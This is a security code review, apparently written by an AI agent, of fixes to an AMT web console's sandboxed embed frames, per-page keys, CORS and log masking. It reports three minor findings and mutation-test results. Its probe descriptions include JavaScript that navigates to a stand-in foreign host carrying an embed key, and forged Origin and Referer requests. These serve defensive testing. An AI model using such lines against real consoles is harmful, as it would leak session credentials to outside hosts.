# amt-console fix packet: final adversarial review

Review, 2026-10-21, of `21fd097..b7b1284` (five commits: 457443a, 91fcd99, 42b5fe9, a0afc9c, b7b1284). Every citation is
`file:line` at `b7b1284` (HEAD). Read cold against the prior review (`docs/sprint-review-2026-10-21.md`). The brief: try to
break the fixes, not confirm them; B1 hardest.

Method. Read the full diff and, at HEAD, `console/server.py`, `console/embed.py`, `console/auth.py`, `console/fleet.py`,
`console/power.py`, `console/mcp_client.py` (validate_call, http_request), `console/static/embed.js`, `console.js`, `serial.js`,
`components.js` (confirmedCall), and the `amt_mirror.py` / `amt_serial.py` handlers around the record and input routes. Ran the
review's own probes against the suite's fakes (`FakeAmt`, `FakeViewer`, headless Chromium) in a scratch copy of the repo
(the scratch probes, probes at `console/tests/probe_fable_nobrowser.py` and `probe_fable_browser.py`): 31 no-browser probes and
5 browser probes, plus 12 one-edit mutation runs of the suite's own tests, each on a fresh copy with bytecode purged
(the scratch probes, output the scratch probes). No file under `the repo` was changed; no host,
NAS, vault or network beyond 127.0.0.1 was touched. The ~32-minute full suite was not run here (it was running in the real tree).

A finding marked **confirmed** has a reproduction or an exact code trace; **hypothesis** does not.

## Verdict

**Ship after fixes** (two minors, each a one-line mask; nothing blocks). B1 is closed as ruled: the relayed page runs in an
opaque origin and cannot reach the console's DOM, globals, cookie, CSRF token or `/api` (reproduced from inside the frame and
from the Open-in-a-tab document), cannot navigate the top window, open a popup, submit a form, or carry its key out of the frame
(the parent's `frame-src 'self'` stops a self-navigation to a foreign origin). The per-page key authenticates every `/embed/`
request; a wrong, flipped, truncated, other-kind, other-server, revoked, idle or session-expired key is a 404 with nothing sent
upstream and no CORS grant; sign-out and session expiry end an open stream within `KEY_RECHECK`. CORS `*` appears only on a
valid-key `/embed/` response. M1 is closed: `record` is not a relayed route anywhere (the console 404s it before anything goes
upstream; the viewer refuses it with `embed=1`; the embed page has no Record control), and both record sheets send the tool's
real action names with `confirmed: true`. M2 is closed on the routes the review named and **partly open** on two fields the fix
did not reach (finding 1). The old defect-pinning tests were inverted or replaced, not deleted, and the key tests bite under
mutation (table below).

## Findings

| # | Severity | Where (`@b7b1284`) | Defect | Evidence | Label |
|---|---|---|---|---|---|
| 1 | Minor (M2 residue) | `console/fleet.py:153`, `:163` (`clean_mirror` / `clean_terminal` emit `"error": _str(m.get("error"))`); `:115` (`"next_boot": _scalars(...)`); reach the browser via `console/embed.py:306-307` (`/api/embed/<kind>/<server>`) and `console/fleet.py:536-538` (`sessions.kvm.error`, `sessions.sol.error`, `status.next_boot.*` on `/api/server/<key>` and `/api/fleet`) | The M2 fix masks `error`, `sessions_error`, `devices_error`, the captures error and the power error, but not the session views' own `error` field (the viewer's `info()` error string, `amt_mirror.py:314`) nor the `next_boot` scalars of the status read; both are cut to 300 and sent unmasked. Same class as the original M2: a broken guard, no known producer of a one-time url in these fields today (the viewer's `error` is `f"{type(ex).__name__}:{ex}"` from a KVM/SOL connect, `amt_mirror.py:240` / `amt_serial.py:104`). The contract stated in `CLAUDE.md:14` and `server.py:13-14` is still broader than the build. Fix: `_masked(_str(...))` in both `clean_*` and `_masked` over the string values in `_scalars` (one place covers `next_boot`). | Probe `probe_fable_nobrowser.py::test_probe_m2_session_view_error_field_reaches_three_routes_unmasked`: a scripted viewer status whose `error` carries a 32-char `/m/` url and a 43-char `/handoffs/` url: both sentinels verbatim in `/api/embed/mirror/<key>`, `/api/embed/serial/<key>`, `/api/server/<key>` and `/api/fleet`. `::test_probe_m2_next_boot_scalars_unmasked`: a scripted `amt_status` with `next_boot: {note: <urls>}`: both sentinels in `/api/server/<key>` and `/api/fleet`. | confirmed |
| 2 | Minor | `console/server.py:66` (`EMBED_KEY_IN_PATH = ...[A-Za-z0-9_-]{16,}(?=/|$)`), used by `loggable` at `:146`, which feeds `log_request` (`:184`), the cross-site-refused warning (`:378`) and the fault line (`:278`) | The log mask needs the key to be followed by `/` or end-of-path; a real key followed by any other byte (`.`, `~`, `%2F`, `%2e%2e/`) does not match, so the full key is written to the access log on the 404 that refuses the request. Only a holder of the key can send such a path (the viewer's own relative urls never produce one), so this is a narrow leak of a credential the sender already holds into a log the operator reads; still, it is the one log path the brief asked about that is open. Fix: drop the lookahead (`(/embed/[^/]*/[^/]*/)[A-Za-z0-9_-]{16,}` masks the run whatever follows) and add the `.`/`%2F` shapes to `test_loggable_masks_an_embed_key_wherever_it_sits_in_the_path`. The `[:200]` slice at `:184` runs before the mask but cannot cut a key: the key ends by offset 121 at most (`/embed/serial/<63-char server>/<43-char key>`). | Probe `::test_probe_key_in_log_line_when_followed_by_a_non_slash[. | %2Fstatus.json | %2e%2e/ | ~ | x.y]`: each 404 produced an INFO line `GET /embed/mirror/my-server-1/<the real key>. 404` with the minted key verbatim (five of five shapes). `loggable()` alone: `'/embed/mirror/my-server-1/K…K%2Fstatus.json'` and `'…K.'` returned unchanged; `'…K/status.json'` masked. | confirmed |
| 3 | Minor (test gap, no defect) | `console/tests/test_console_embed_browser.py:74`, `:77`, `:132-157`, `:174`; `console/tests/test_console_embed.py:142-151` | The suite pins the sandbox attribute string, the absence of `allow-same-origin`, `window.origin === "null"` and (in the tab only) `window.open() === null`; it does not assert the effect of the two other absent flags inside the frame (`top.location = …` throwing; `window.open()` null from the frame) nor that a self-navigation of the frame to a foreign origin is stopped. All hold today (probe), so this is enforcement, not a defect: a future `allow-popups` or `allow-top-navigation` on the attribute is caught only by the exact-string assertion at `test_console_embed.py:151`. Fix: fold the probes below into `test_the_framed_page_is_an_opaque_origin…`. | Probe `probe_fable_browser.py::test_probe_frame_cannot_navigate_top_open_popups_or_submit_forms`: from the frame `top.location` and `top.location.href` assignment → `SecurityError`; `window.open('/')` → `null`; `<a target=_top>` click → top url unchanged; `<a target=_blank rel=opener>` click → still one page in the context; `<form method=post action=/auth/signout>` submit → frame CSP violation `form-action`, `/api/session` still 200. `::test_probe_frame_self_navigation_to_a_foreign_origin_is_stopped_by_the_parents_frame_src`: `location.href = 'https://elsewhere.example.test/?k=' + pathname` → parent violation `frame-src https://elsewhere.example.test`, zero requests to the routed foreign origin. | confirmed (holds) |

No blocker and no major found. Everything below is a design fact or a residual within the operator's ruling, recorded so the
report says it rather than echoing the docstrings.

### Design facts to state plainly (not defects)

- **The Origin rule on the embed POST is not a boundary.** `server.py:377` accepts `Origin: null` or the console's own. Any page
  on any site produces `Origin: null` by wrapping a sandboxed iframe, and `Sec-Fetch-Site` is not checked there. The key in the path
  is the credential; the Origin check is belt. Probe `::test_probe_origin_null_is_not_a_boundary`: a POST with `Origin: null`,
  `Sec-Fetch-Site: cross-site`, `Referer: https://evil.example/`, no cookie and a valid key → 200, relayed. Without the key every
  shape is 404 (`::test_probe_cors_absent_off_the_keyed_route`, 15 cases).
- **A key's lifetime is a pool per (session, kind, server), not one page view.** `Keys.touch` (`embed.py:120-127`) refreshes every
  key of that triple on each `/api/embed/<kind>/<server>` poll, and `check` (`:117`) refreshes on every use, including the stream's
  2-second recheck. So a key lives while any console page for that server polls or while any holder uses it, bounded by sign-out
  and the 12-hour session idle. Probe `::test_probe_key_lifetime_is_a_pool_not_a_page_view`: two keys kept alive past their idle
  limit by one poll; one key kept alive five idle-limits by use alone with no page open, then dead one limit after the last use.
- **Keys are not cookie-bound at use** (`::test_probe_key_use_is_independent_of_the_cookie_presented`: a bogus cookie beside a
  valid key → 200). By design: the frame has no cookie.
- **Open in a tab puts the key in a top-level URL** (address bar, history), and the tab's document, being top-level, has no parent
  `frame-src` to stop a self-navigation: the viewer's own script could carry the key to a foreign origin. Probe
  `::test_probe_tab_self_navigation_to_a_foreign_origin_carries_the_key_out`: `location.href = 'https://elsewhere.example.test/?k='
  + pathname` from the tab reached the routed foreign origin with the key in the query. The only party that can do this is the
  viewer front (the amt-mcp process), which already holds the host's KVM/SOL session; a carried-out key grants that holder the same
  screen and live input and nothing of the console session (no cookie, no CSRF, no `/api`). Within the ruling; worth one sentence
  in the design note. `Referrer-Policy: no-referrer` (`server.py:194`) closes the Referer channel in both the frame and the tab.
- **The frame cannot even load a console page inside itself.** Probe
  `::test_probe_frame_self_navigation_to_the_consoles_api_carries_no_cookie`: `location.href = '/api/session'` from the frame ends at
  `chrome-error://chromewebdata/` (the console's own `X-Frame-Options: DENY` + `frame-ancestors 'none'` refuse the render) and the
  frame's origin stays `null`.
- **The key sits in the console DOM exactly twice** (frame `src`, Open-in-a-tab `href`;
  `::test_probe_frame_src_and_link_are_the_only_places_the_key_is_in_the_console_dom`), readable only by the console's own
  `/static` scripts (console CSP `default-src 'self'`, no inline script).
- **Lock ordering is acyclic.** The only nesting is `Keys._lock` → `auth.is_live` → `auth._lock` (RLock) inside `Keys._prune`
  (`embed.py:93`). `auth.py` names no `Keys`, `revoke` or `touch` in code (grep: zero code lines); `fleet.py` never reaches
  `app.keys`; `_signout` calls `revoke_session` then `auth.destroy` sequentially (`server.py:609-610`); `Embed._lock` and
  `fleet._lock` are taken only after `keys.check` has returned (`server.py:370` vs `:380`, `:398`). An `is_live` that raises (corrupt
  `sessions.json`) propagates out of the relay's `alive()` into `_guarded`, which ends the stream and shuts the upstream socket:
  fail closed (`::test_probe_alive_raising_ends_the_stream`; log line `handler fault JSONDecodeError on /embed/mirror/my-server-1/<key>/stream`).
- **`allow-forms` is kept on the sandbox but `form-action 'none'` makes it inert** (probe above). Dropping `allow-forms` would be
  tidier; not a defect.
- **`allow="clipboard-write *"`** delegates clipboard writes to whatever document the frame holds; it holds only the relayed viewer
  page (`frame-src 'self'` + the key route). Not a defect.

## B1: the brief's questions, settled

| Question | Answer | Evidence |
|---|---|---|
| Can the framed page reach the console session, CSRF token or `/api`? | No. | Suite `test_the_framed_page_is_an_opaque_origin…` (attribute alone, CSP sandbox stripped by a route) and `test_a_relayed_page_opened_in_a_tab…` (CSP sandbox alone): `parent.amtc`, `parent.document`, `parent.fetch`, `top.document`, `cookie`, `localStorage`, own fetch of `/api/session`, `/api/call`, `/static` all `blocked:`; no `amt_power` reached the fake. Mutations e and f (table). |
| Can a key leak through a log line? | Only on a crafted near-miss path (finding 2). Normal paths, refusals and faults are masked (`test_the_embed_key_is_in_no_log_line_even_a_refusal_or_a_fault`, positive control `test_the_scan_catches_a_planted_embed_key_leak`). `send_error` is overridden (`server.py:209-213`) so http.server's own 400/414/501 pages go through `_error` → `send_response` → `log_request`, which masks; `log_error`/`log_message` are never reached with a path. | Suite + probe. |
| Referer? | No: `Referrer-Policy: no-referrer` on every console response including the embed ones (`server.py:194`; `embed_headers` only adds), `referrerpolicy=no-referrer` on the iframe (`embed.js:153`), `rel=noopener` on the tab link. The relay builds its own upstream headers (`embed.py:331-335`: Accept, Content-Type, Last-Event-ID only). | Suite `test_the_framed_page_still_streams…`: upstream saw no cookie/origin/referer/authorization and no key. |
| Error body? | `EmbedError.extra` carries only `detail` (masked, `embed.py:280`) and `bind` (a hostname). | Code trace. |
| Upstream request? | Path is `<viewer>/<prefix>/<control token>/<rest>?embed=1` (`embed.py:336`), never the key; the suite's leak scan includes `viewer.requests` and `hosts.fake.requests` for every minted key, with a planted positive control. | `test_console_embed.py:651-652`, `:690-706`. |
| Open in a tab? | Same keyed path as the frame; opaque via the response CSP `sandbox allow-scripts allow-forms` (`server.py:83`); `window.open` null there. Key in the URL bar/history by design. | Suite tab test; probe. |
| History / redirect? | A missing trailing slash is a 404, not a redirect (`server.py:370`); a viewer 3xx is a 502 with no `Location` (`embed.py:347-349`). | Suite `test_an_unknown_server_or_kind…`, `test_a_viewer_redirect_is_not_followed…`. |
| Is CORS `*` scoped to valid-key embed paths only? | Yes. Wrong key → `_error(404)` with no CORS header before anything else (`server.py:370-371`); a path that fails `EMBED_ROUTE` (no key, 42/44-char key, `/embed/`, `/embed/x`) → 404/501 with no `Access-Control-*`; `/api`, `/static`, `/signin`, `/` carry none; OPTIONS off `/embed/` is 501. | Suite `test_a_key_authed_embed_path_answers_cors…`, `test_a_wrong_key_is_a_404…`; probe, 15 cases; mutation d. |
| Wrong/expired/revoked/other-server/other-kind key → 404, nothing upstream? | Yes; `check` runs before `_known_server` and before `embed.open`. | Suite tests for each; mutations c, g, j. |
| Sign-out ends open streams? | Yes, quiet or busy, within `KEY_RECHECK`; session idle too. | Suite (both parametrisations); mutation a. |
| Origin rule on embed POST sound? | It is belt, not the credential (design fact above). | Probe. |
| Lock-ordering deadlock? | None (design fact above). | Grep + trace. |
| CSP keeps the framed page inside `/embed/`? | Yes: `default-src 'none'`, `connect-src`/`img-src`/`script-src`/`style-src`/`font-src` = `<origin>/embed/` (`server.py:81-82`); `frame-src` falls back to `'none'`; `base-uri 'none'`; `form-action 'none'`. | Suite probe (`own fetch /api/session` blocked); my probe (a fetch of another server's path under `/embed/` with this key → 404 without CORS → `TypeError`). |
| Top navigation / popups? | Blocked (finding 3's probe). | Probe. |

## M1 and M2

- **M1 closed.** `embed.POST_ROUTES = {"mirror": {"input"}, "serial": {"input"}}` (`embed.py:49`), pinned against the real viewers'
  route tables (`test_the_allowlist_is_the_embed_page_s_routes_of_the_real_viewer`). A POST to `record` with any query is a 404
  here with nothing upstream and no non-status tool call (`test_record_is_not_a_relayed_route…`, 8 cases; mutation h). The viewers
  refuse `record` with `embed=1` (`amt_mirror.py:878-880`, `amt_serial.py:306-308`; `tests/test_mirror.py` / `test_serial.py`
  `test_an_embed_request_cannot_start_or_stop_a_recording`, 8 cases each, start and stop). The embed page source has no `#rec`,
  no `rec.onclick`, no `fetch('record` (both page tests). The only relayed write is `input`: `amt_mirror._input` (`:910-926`)
  forwards KVM events, `amt_serial.handle_post` (`:313-330`) forwards typed bytes (≤4096), both control-token only. No
  `record?on=` reference survives in `console/static`, `console/pages`, `design/*.html`, `README.md`, `CLAUDE.md` or the design
  note (grep: zero). Decision 3 is amended with the ruling (`docs/ux-design-2026-10-20.md`: "Record is not an exception (operator
  ruling, 2026-10-21…)"), and the 2.5/2.6 chrome, table row 7 and the embed-mode paragraphs were rewritten to match. The
  design-note drift beside M1 (`CLAUDE.md:109`, `:126`) is fixed: the exception sentence now names `input`.
- **Record sheets.** `E.recordControl` (`embed.js:249-274`) sends `{tool: amt_mirror_link|amt_serial_link, arguments: {device,
  action: 'record_start'|'record_stop'}}`; `confirmedCall` (`components.js:143-145`) adds `confirmed: true` at sheet build for
  every write, so both calls carry it (the browser test reads the sheet text with `confirmed: true` for both and the fake receives
  `{"device", "action": "record_start", "confirmed": True}`). Action names match `MirrorAction` / `SerialAction`
  (`amt_mirror.py:85`, `amt_serial.py:60`); `record_start` needs `confirmed` (`amt_mirror.py:1170-1171`, `amt_serial.py:652-653`),
  `record_stop` returns before the check (`:1168`, `:650`), and `mcp_client.UNCONFIRMED_ACTIONS` exempts only `record_stop`
  (`:39-40`), so the console refuses an unconfirmed `record_start` before send (probe
  `::test_probe_record_calls_validate_and_reach_the_fake_with_confirmed`, 4 cases: confirmed → 200 and the exact call at the fake;
  unconfirmed `record_start` → 400 `confirmed_not_true`). No `directory` argument is sent, so the tool's persisted recording folder
  applies, which the sheet text says.
- **M2 closed on the four named fields and the captures list**, by `fleet.clip` (mask, then cut; `fleet.py:75-89`) at every store
  and `_masked` again at `Fleet.public` / `snapshot` (`:533`, `:538`, `:546`) and `power.read_offered` (`power.py:70`, `:74`).
  Suite: six new fleet tests and two power tests, including the straddling-cut case and a store-forgot-to-mask case; mutations k
  and l. **Partly open:** finding 1.

## Earlier findings: status

| Finding | Status at `b7b1284` |
|---|---|
| B1 | **Closed** as ruled (opaque frame + per-page key). Residuals recorded above: Origin is belt; key-pool lifetime; the tab's self-navigation can carry the key to a foreign origin (viewer front only; grants nothing new). |
| M1 | **Closed.** |
| M2 | **Partly closed**: the four named fields, the captures error and the power error are masked; the session views' `error` and the `next_boot` scalars are not (finding 1). |
| m1 | **Closed**: `data-pin-row` on the row (`servers.js:139`); the state check runs on the built pages (`test_console_verifier.py:276-278`) with a planted-defect browser test and a non-vacuity floor (`:324`). |
| m2 | **Closed**: contrast and ring floors asserted on the build by the mockup run's own functions, planted faint text/ring caught on a real page, and a sentinel test proving `verify_render` calls them. |
| m3 | **Closed**: both static scans are `{32,}` with an exact-string `NOT_TOKENS` allowlist; a real `token_urlsafe(24)` is reported, 31 chars pass, and every listed name must still be in the client (`test_console_secrets.py:14-16`, `:140-186`; `check_mockups.py:31-42`). |
| m4 | **Still open, out of packet scope**: `test_console_theme.py` is not in the diff; the hue tests still skip without `material_color_utilities`. |
| m5 | **Still open, out of packet scope**: `E.attemptDone` re-arms the same button (`embed.js:84`, unchanged); the no-retry test is still name-based. |
| m6 | **Still open, out of packet scope**: `auth.py`'s 14 added lines are `session_ref` / `is_live` only; the 256-pending challenge table is unchanged. |
| m7 | **Still open, out of packet scope**: in-memory lockout counter unchanged. |

## Tests: changed to assert the fix, and not vacuous

The tests that pinned the old state were inverted or replaced, not deleted: the sandbox-string assertion now pins
`allow-scripts allow-forms` and adds the effect (`window.origin === "null"`); the record-relay tests became
`test_record_is_not_a_relayed_route…` and `test_a_post_is_relayed_whole_and_only_the_input_route_is_relayed`; the cookie-based
"signed-out browser" test became the key tests; the policy test in `test_console_components.py` now frames a keyed path with
no sandbox attribute and asserts the origin is `null` from the response alone; `test_mirror.py` / `test_serial.py` dropped
the "still records" line and added the refusal tests (start and stop, 4 query shapes, both token kinds). The B1 browser test
asserts `served` is non-empty, so the attribute-alone run cannot pass on an untouched response.

Mutation runs (one edit per fresh copy, `__pycache__` purged, `PYTHONDONTWRITEBYTECODE=1`; the embed suite unless noted; the
RED names were read, not counted, and no two mutations share a RED set):

| Mutation | Byte delta | RED (which tests) |
|---|---|---|
| a. drop `alive=` from the stream relay (`server.py:410`) | −80 | 3: `test_a_stream_already_open_ends_when_its_key_is_revoked_at_sign_out[quiet-stream]`, `[busy-stream]`, `…ends_when_its_session_idles_out` |
| b. `break` after the digest match in `Keys.check` | +26 | 1: `test_the_key_check_compares_in_constant_time…` |
| c. ignore `(kind, server)` in `Keys.check` | −54 | 1: `test_a_key_works_for_its_own_kind_and_server_only` |
| d. send `EMBED_CORS` on the wrong-key 404 | +22 | 1: `test_a_wrong_key_is_a_404_with_nothing_sent_upstream_and_no_cors_grant` |
| e. `allow-same-origin` back on the iframe attribute (embed suite + browser `-k "grants or opaque or tab"`) | +18 | 2: `test_no_script_or_page_of_the_console_ever_grants_a_frame_the_console_s_origin`, browser `test_the_framed_page_is_an_opaque_origin_that_cannot_reach_the_console_page_or_its_session` (the attribute-alone test; the tab test stays green, correctly: the CSP sandbox still holds the tab) |
| f. CSP `sandbox` directive removed from `embed_headers` (embed suite + browser `-k "framed_by_a_console_page or opaque or tab"`) | −33 | 3: `test_the_embed_responses_may_be_framed_by_a_console_page_and_nothing_else`, browser `…is_an_opaque_origin…` (its sandbox-dropping route asserts the header changed), browser `test_a_relayed_page_opened_in_a_tab_is_an_opaque_origin_too` |
| g. `revoke_session` removed from `_signout` | −155 | 1: `test_a_key_dies_at_sign_out_and_with_an_idle_session` (its `_keys == []` assertion; the next request would 404 anyway through `_prune`/`is_live`: two mechanisms hold the property, and the test names the one specific to revoke) |
| h. `record` back in `POST_ROUTES` | +20 | 10: `test_a_standalone_or_unknown_route_is_refused…[POST-record]`, `test_the_allowlist_is_the_embed_page_s_routes_of_the_real_viewer`, all 8 `test_record_is_not_a_relayed_route…` |
| i. embed POST Origin check removed | −74 | 2: `test_a_post_needs_a_null_or_the_consoles_own_origin_and_no_other`, `test_the_embed_key_is_in_no_log_line_even_a_refusal_or_a_fault` (it expects the refusal's masked log line) |
| j. `_prune` removed from `Keys.check` | −26 | 3: `test_a_key_dies_when_its_session_idles_out`, `test_a_key_expires_after_its_idle_limit_and_a_use_restarts_the_clock`, `test_a_stream_already_open_ends_when_its_session_idles_out` |
| k. `clip` cuts then masks (fleet suite `-k masked`) | +0 (same length; purge + distinct RED set from l rule out borrowed bytecode) | 1: `test_a_token_the_cut_lands_inside_is_masked_before_the_cut` |
| l. `Fleet.public` stops masking `error` (fleet suite `-k masked`) | −9 | 1: `test_public_masks_a_text_stored_unmasked` |

## Not checked, and why

- The full suite and the aggregate verifier (running in the real tree). I ran the embed suite under each mutation, the fleet
  masking selection, the five browser probes and the 31 no-browser probes.
- Live behaviour: no AMT host, NAS, reverse proxy, real viewer front or vault. Whether the reverse proxy preserves `OPTIONS`,
  `Access-Control-*` and the streamed `/embed/` responses is unverified here, as before.
- `Keys` under real concurrency (many sessions, 256-key eviction while streams run): read only; eviction keeps a streaming key
  alive because the 2-second recheck refreshes `seen`.
- m4–m7: not re-examined beyond confirming the packet did not touch them.

## Disposition

All three findings are fixed in the commit that adds this file. Finding 1: `fleet._str` and `_scalars` mask, then cut, every string the
fleet readers keep (`test_a_session_view_s_own_error_is_masked_on_every_route`, `test_the_next_boot_fields_are_masked_on_both_routes`).
Finding 2: `EMBED_KEY_IN_PATH` lost its lookahead (`test_a_real_key_with_a_stray_suffix_is_refused_and_never_logged`, three new
`loggable` cases). Finding 3: `test_the_framed_page_cannot_move_the_top_window_open_a_popup_or_submit_a_form` (the CSP sandbox
stripped, so the attribute holds it alone) and `test_a_frame_that_navigates_itself_to_a_foreign_origin_is_stopped_and_its_key_stays_home`.
Each new test went red with its fix undone once. m4 to m7 stay open as minors.
